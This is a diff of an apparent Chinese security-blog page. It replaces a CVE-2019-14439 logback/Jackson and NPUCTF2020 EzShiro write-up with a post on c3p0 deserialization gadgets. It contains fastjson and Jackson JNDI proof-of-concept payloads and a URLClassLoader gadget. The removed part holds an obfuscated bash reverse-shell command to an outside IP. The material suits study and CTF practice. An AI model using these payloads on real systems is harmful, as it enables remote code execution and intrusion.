@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="images/favicon.ico">
-  <title>CVE-2019-14439以及[NPUCTF2020]EzShiro复现 | fmyyy</title>
+  <title>C3P0 | fmyyy</title>
   <meta name="author" content="fmyyy" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -15,16 +15,16 @@
   
     <meta name="keywords" content="" />
   
-  <meta name="description" content="CVE-2019-14439以及[NPUCTF2020]EzShiro复现CVE-2019-14439是由logback 引起的 jndi 注入，找不到详细分析的文章，对着网上的poc简单看了一下。 在ch.qos.logback.core.db.JNDIConnectionSource这个类里   漏洞原理并不复杂，很清晰明了的jndi注入。 poc 1234567891011121314151">
+  <meta name="description" content="c3p012345&lt;dependency&gt;	&lt;groupId&gt;com.mchange&lt;&#x2F;groupId&gt;	&lt;artifactId&gt;c3p0&lt;&#x2F;artifactId&gt;	&lt;version&gt;0.9.5.2&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;    Gadgetjndi+fastjsonpoc: 12">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2019-14439以及[NPUCTF2020]EzShiro复现">
-<meta property="og:url" content="https://fmyyy.gitee.io/2021/12/22/CVE-2019-14439/index.html">
+<meta property="og:title" content="C3P0">
+<meta property="og:url" content="https://fmyyy.gitee.io/2022/05/05/c3p0/index.html">
 <meta property="og:site_name" content="fmyyy">
-<meta property="og:description" content="CVE-2019-14439以及[NPUCTF2020]EzShiro复现CVE-2019-14439是由logback 引起的 jndi 注入，找不到详细分析的文章，对着网上的poc简单看了一下。 在ch.qos.logback.core.db.JNDIConnectionSource这个类里   漏洞原理并不复杂，很清晰明了的jndi注入。 poc 1234567891011121314151">
+<meta property="og:description" content="c3p012345&lt;dependency&gt;	&lt;groupId&gt;com.mchange&lt;&#x2F;groupId&gt;	&lt;artifactId&gt;c3p0&lt;&#x2F;artifactId&gt;	&lt;version&gt;0.9.5.2&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;    Gadgetjndi+fastjsonpoc: 12">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
-<meta property="article:published_time" content="2021-12-22T05:14:04.000Z">
-<meta property="article:modified_time" content="2021-12-22T06:03:40.000Z">
+<meta property="article:published_time" content="2022-05-05T12:00:04.000Z">
+<meta property="article:modified_time" content="2022-05-05T12:00:21.011Z">
 <meta property="article:author" content="fmyyy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
@@ -171,17 +171,17 @@
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center">CVE-2019-14439以及[NPUCTF2020]EzShiro复现</h1>
+                <h1 class="kratos-entry-title text-center">C3P0</h1>
             
             
             <ul class="kratos-post-meta text-center">
-                <li><i class="fa fa-calendar"></i> 2021-12-22</li>
+                <li><i class="fa fa-calendar"></i> 2022-05-05</li>
                 <li><i class="fa fa-user"></i> 作者 fmyyy</li>
                 <li>
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~2.58K
+                        ~3.99K
                     
                     字
                 </li>
@@ -190,42 +190,40 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1640153020000"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1651752021011"></time> 前，其中的内容可能需要更新。
             </div>
             
                 <div class="kratos-post-inner-toc">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-14439%E4%BB%A5%E5%8F%8A-NPUCTF2020-EzShiro%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">CVE-2019-14439以及[NPUCTF2020]EzShiro复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-14439"><span class="toc-number">2.</span> <span class="toc-text">CVE-2019-14439</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPUCTF2020-EzShiro"><span class="toc-number">3.</span> <span class="toc-text">[NPUCTF2020]EzShiro</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#c3p0"><span class="toc-number">1.</span> <span class="toc-text">c3p0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget"><span class="toc-number">1.1.</span> <span class="toc-text">Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jndi-fastjson"><span class="toc-number">1.1.1.</span> <span class="toc-text">jndi+fastjson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hex-fastjson"><span class="toc-number">1.1.2.</span> <span class="toc-text">hex+fastjson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#httpbase"><span class="toc-number">1.1.3.</span> <span class="toc-text">httpbase</span></a></li></ol></li></ol></li></ol>
                 </div>
             
             <hr />
-            <h2 id="CVE-2019-14439以及-NPUCTF2020-EzShiro复现"><a href="#CVE-2019-14439以及-NPUCTF2020-EzShiro复现" class="headerlink" title="CVE-2019-14439以及[NPUCTF2020]EzShiro复现"></a>CVE-2019-14439以及[NPUCTF2020]EzShiro复现</h2><h2 id="CVE-2019-14439"><a href="#CVE-2019-14439" class="headerlink" title="CVE-2019-14439"></a>CVE-2019-14439</h2><p>是由logback 引起的 jndi 注入，找不到详细分析的文章，对着网上的poc简单看了一下。</p>
-<p>在<strong>ch.qos.logback.core.db.JNDIConnectionSource</strong>这个类里</p>
-<p><img src="http://img.le1a.com/2021/12/21/37432c490ae95.jpeg" alt="1640089832227.jpeg"></p>
-<p><img src="http://img.le1a.com/2021/12/21/2c9933baf6986.jpeg" alt="1640080058330.jpeg"></p>
-<p>漏洞原理并不复杂，很清晰明了的jndi注入。</p>
+            <h1 id="c3p0"><a href="#c3p0" class="headerlink" title="c3p0"></a>c3p0</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h2><h3 id="jndi-fastjson"><a href="#jndi-fastjson" class="headerlink" title="jndi+fastjson"></a>jndi+fastjson</h3><p>poc:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">    String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,\&quot;jndiName\&quot;:\&quot;ldap://127.0.0.1:1099/Calc\&quot;, \&quot;loginTimeout\&quot;:0&#125;&quot;;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>com.mchange.v2.c3p0.JndiRefForwardingDataSource继承com.mchange.v2.c3p0.JndiRefDataSourceBase</p>
+<p>最后是来到这</p>
+<p><img src="https://img.le1a.com/2022/05/05/d15f8fc3aa15f.png" alt="1651747953530.png"></p>
+<p>调用栈</p>
+<p><img src="https://img.le1a.com/2022/05/05/738a9cf9f37cc.png" alt="1651748006400.png"></p>
+<p>地址在其com.mchange.v2.c3p0.JndiRefDataSourceBase的setJndiName被赋值</p>
+<p><img src="https://img.le1a.com/2022/05/05/4ab1520bcb4f7.png" alt="1651748049653.png"></p>
+<h3 id="hex-fastjson"><a href="#hex-fastjson" class="headerlink" title="hex+fastjson"></a>hex+fastjson</h3><p>不出网的时候可以用这个gadget</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    String payload = <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    \&quot;a\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        \&quot;val\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    \&quot;b\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        \&quot;userOverridesAsString\&quot;: \&quot;HexAsciiSerializedMap:hex编码内容;\&quot;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>终点在这</p>
+<p><img src="https://img.le1a.com/2022/05/05/1e3c72c9072cb.png" alt="1651751502918.png"></p>
+<p>调用栈</p>
+<p><img src="https://img.le1a.com/2022/05/05/17cb97d5b0669.png" alt="1651751537378.png"></p>
+<h3 id="httpbase"><a href="#httpbase" class="headerlink" title="httpbase"></a>httpbase</h3><p>基于URLClassloader</p>
 <p>poc</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Jackson;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">logback</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">				String json = <span class="string">&quot;[\&quot;ch.qos.logback.core.db.JNDIConnectionSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;jndiLocation\&quot;:\&quot;ldap://127.0.0.1:1089/Exploit\&quot;&#125;]&quot;</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        Object o = mapper.readValue(json, Object.class);</span><br><span class="line">        mapper.writeValueAsString(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.naming.ReferenceIndirector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">c3p</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        PoolBackedDataSourceBase a = <span class="keyword">new</span> PoolBackedDataSourceBase(<span class="keyword">false</span>);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&quot;</span>);</span><br><span class="line">        Field f1 = clazz.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>); <span class="comment">//此类是PoolBackedDataSourceBase抽象类的实现</span></span><br><span class="line">        f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f1.set(a,<span class="keyword">new</span> evil());</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream ser = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">&quot;a.bin&quot;</span>)));</span><br><span class="line">        ser.writeObject(a);</span><br><span class="line">        ser.close();</span><br><span class="line">        ObjectInputStream unser = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;a.bin&quot;</span>));</span><br><span class="line">        unser.readObject();</span><br><span class="line">        unser.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span> <span class="keyword">implements</span> <span class="title">ConnectionPoolDataSource</span>, <span class="title">Referenceable</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PrintWriter <span class="title">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLoginTimeout</span> <span class="params">( <span class="keyword">int</span> seconds )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Reference(<span class="string">&quot;evilexp&quot;</span>,<span class="string">&quot;evilexp&quot;</span>,<span class="string">&quot;http://127.0.0.1:10099/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://img.le1a.com/2021/12/21/848f3fd9f2c27.png" alt="1640080727072.png"></p>
-<h2 id="NPUCTF2020-EzShiro"><a href="#NPUCTF2020-EzShiro" class="headerlink" title="[NPUCTF2020]EzShiro"></a>[NPUCTF2020]EzShiro</h2><p>一开始没做出来，后来看wp知道附件有pom.xml buu似乎没给</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">1.5</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">1.5</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;logback-core&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">1.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">  &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
-
-<p>看到有logback 先是shiro的权限绕过来到/json。访问/;/json</p>
-<p>post一个true看到Jackson</p>
-<p><img src="http://img.le1a.com/2021/12/21/1ad7d9fc6fadc.png" alt="1640089703761.png"></p>
-<p>jackson+logback  应该就是CVE-2019-14439了,源码应该是用jackson对post的json数据进行反序列化</p>
-<p>但遇到个问题，我直接打没有打通，这里好像还需要绕限制。</p>
-<p>看了看wp，参考的是这个。文章里有提到</p>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/942/#ldapgadget">https://paper.seebug.org/942/#ldapgadget</a></p>
-<p><img src="http://img.le1a.com/2021/12/21/645fb09d6d690.png" alt="1640093819476.png"></p>
-<p>应该是题目jvm版本太高了。得加载题目自带的链子，看到pom里有commons-collections</p>
-<p>wp里直接用ysomap工具了，还没在比赛里用过这个工具，顺带学一学。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/ysomap">https://github.com/wh1t3p1g/ysomap</a></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit LDAPLocalChainListener</span><br><span class="line">set lport <span class="number">6688</span></span><br><span class="line">use payload  CommonsCollections8</span><br><span class="line">use bullet TransformerBullet</span><br><span class="line">set version <span class="number">3</span></span><br><span class="line">set command <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuNzAuNDAuNS8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p>使用这工具必须的是jdk8，并且jdk8版本不能过低</p>
-<p><img src="http://img.le1a.com/2021/12/22/ef14d6a5edfdb.png" alt="1640147973090.png"></p>
-<p>能弹成功，期末考完去研究一下工具源码</p>
+<p>PoolBackedDataSource在序列化时可以序列化入一个任意Reference类，在PoolBackedDataSource反序列化时该Reference类中指定的对象会被URLClassLoader远程加载实例化。</p>
 
         </div>
         
@@ -279,7 +277,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "https://fmyyy.gitee.io/2021/12/22/CVE-2019-14439/",
+                text: "https://fmyyy.gitee.io/2022/05/05/c3p0/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -291,10 +289,9 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "https://fmyyy.gitee.io/2021/12/22/CVE-2019-14439/";
-            const title         = "「CVE-2019-14439以及[NPUCTF2020]EzShiro复现」";
-            const excerpt       = `CVE-2019-14439以及[NPUCTF2020]EzShiro复现CVE-2019-14439是由logback 引起的 jndi 注入，找不到详细分析的文章，对着网上的poc简单看了一下。
-在ch.qos.logback.c...`;
+            const hostUrl       = "https://fmyyy.gitee.io/2022/05/05/c3p0/";
+            const title         = "「C3P0」";
+            const excerpt       = `c3p012345&lt;dependency&gt;	&lt;groupId&gt;com.mchange&lt;/groupId&gt;	&lt;artifactId&gt;c3p0&lt;/artifactId&gt;	&lt;...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -316,7 +313,7 @@
                     
                 </div>
                 <div class="pull-date">
-                <span>最后编辑：2021-12-22</span>
+                <span>最后编辑：2022-05-05</span>
                 </div>
             </div>
         </footer>
@@ -325,13 +322,9 @@
         <nav class="navigation post-navigation clearfix" role="navigation">
             
             <div class="nav-previous clearfix">
-                <a title=" 2021安洵杯ezjson-wp" href="/2021/12/02/2021安洵杯ezjson-wp/">&lt; 上一篇</a>
+                <a title=" 随便写写的日记" href="/2022/05/04/diary/">&lt; 上一篇</a>
             </div>
             
-            
-            <div class="nav-next clearfix">
-                <a title=" 解析excel文件引起的xxe" href="/2022/01/18/解析excel引起的xxe/">下一篇 &gt;</a>
-            </div>
             
         </nav>
     
@@ -373,7 +366,7 @@
         <span class="toc-progress-bar"></span>
     </h4>
     <div class="textwidget">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-14439%E4%BB%A5%E5%8F%8A-NPUCTF2020-EzShiro%E5%A4%8D%E7%8E%B0"><span class="toc-text">CVE-2019-14439以及[NPUCTF2020]EzShiro复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-14439"><span class="toc-text">CVE-2019-14439</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPUCTF2020-EzShiro"><span class="toc-text">[NPUCTF2020]EzShiro</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#c3p0"><span class="toc-text">c3p0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget"><span class="toc-text">Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jndi-fastjson"><span class="toc-text">jndi+fastjson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hex-fastjson"><span class="toc-text">hex+fastjson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#httpbase"><span class="toc-text">httpbase</span></a></li></ol></li></ol></li></ol>
     </div>
 </aside>
                 
